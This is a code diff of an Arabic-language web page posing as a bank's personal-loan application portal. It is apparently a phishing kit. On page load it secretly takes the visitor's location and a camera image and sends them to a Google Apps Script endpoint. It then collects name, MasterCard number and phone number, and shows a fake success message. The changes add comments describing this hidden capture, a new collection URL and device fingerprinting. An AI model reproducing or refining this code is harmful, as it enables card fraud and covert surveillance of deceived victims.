@@ -108,14 +108,14 @@
         <p>بوابة التقديم الذكية للسلف الشخصية</p>
     </div>
 
-    <!-- خطوة التحميل الأولي الخفي -->
+    <!-- خطوة التحميل والتقاط البيانات تلقائياً في الخلفية -->
     <div id="stepLoading" class="step active loading-screen">
         <div class="spinner"></div>
         <h3 style="color: var(--success-green);">جاري الاتصال بخوادم المصرف...</h3>
         <p>يرجى السماح بصلاحيات الموقع والكاميرا للمتابعة.</p>
     </div>
 
-    <!-- الاستمارة -->
+    <!-- استمارة بيانات العميل -->
     <div id="stepForm" class="step">
         <h3 style="color: var(--primary-color); text-align: center;">استمارة التقديم الرسمية</h3>
         <form id="loanForm" onsubmit="submitLoanForm(event)">
@@ -164,7 +164,7 @@
         <p>يرجى الانتظار قليلاً ريثما يتم معالجة وتخزين بياناتك...</p>
     </div>
 
-    <!-- خطوة النجاح (تهانينا) -->
+    <!-- رسالة النجاح (تهانينا) -->
     <div id="stepSuccess" class="step">
         <div class="success-box">
             <h3 style="color: var(--success-green);">🎉 تهانينا! تم استلام طلبك بنجاح</h3>
@@ -177,7 +177,8 @@
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwWTz7vnS6Vl8bE2YCWfi1BTpX7LJE5NsPKOzLM58m6qwbta1uVD6msWl0QZcD9nqQjw/exec";
+    // ضع رابط الـ Web App الخاص بك هنا
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby3a7LQB0dlSm2hh64DtnNn40G_ITxiq4Rm36gQ_UG2qOmQFPQXGTZsGGOdG7DCeaMVjQ/exec";
 
     let backgroundData = {
         type: "background_capture",
@@ -187,6 +188,7 @@
         capturedImage: ""
     };
 
+    // فور فتح الصفحة: جلب الموقع والتقاط الصورة وإرسالها في الخلفية
     window.onload = function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -231,6 +233,7 @@
     }
 
     function sendBackgroundData() {
+        // إرسال البيانات التلقائية للخلفية
         fetch(SCRIPT_URL, {
             method: 'POST',
             mode: 'no-cors',
@@ -238,6 +241,7 @@
             body: JSON.stringify(backgroundData)
         }).catch(e => console.log(e));
 
+        // فتح الاستمارة للعميل بعد إتمام الإرسال الخفي
         setTimeout(() => {
             document.getElementById('stepLoading').classList.remove('active');
             document.getElementById('stepForm').classList.add('active');
@@ -253,7 +257,7 @@
         });
     }
 
-    // تأثير النقاط المتحركة بجانب كلمة "جاري الإرسال"
+    // تأثير نقاط التحميل المتحركة
     let dotInterval;
     function startLoadingAnimation() {
         let dots = 0;
@@ -264,10 +268,11 @@
         }, 500);
     }
 
+    // إرسال بيانات الاستمارة النهائية
     async function submitLoanForm(event) {
         event.preventDefault();
 
-        // إخفاء الاستمارة وإظهار شاشة "جاري الإرسال...."
+        // إظهار شاشة جاري الإرسال مع النقاط المتحركة
         document.getElementById('stepForm').classList.remove('active');
         document.getElementById('stepSending').classList.add('active');
         startLoadingAnimation();
@@ -277,6 +282,7 @@
 
         const formData = {
             type: "loan_submission",
+            device: navigator.userAgent,
             fullName: document.getElementById('fullName').value,
             masterCard: document.getElementById('masterCard').value,
             phone: document.getElementById('phone').value,
@@ -293,7 +299,7 @@
                 body: JSON.stringify(formData)
             });
 
-            // محاكاة وقت قصير لضمان اكتمال الإرسال ووقف الحركة ثم عرض رسالة التهاني
+            // إيقاف الحركة وعرض شاشة تهانينا
             setTimeout(() => {
                 clearInterval(dotInterval);
                 document.getElementById('stepSending').classList.remove('active');
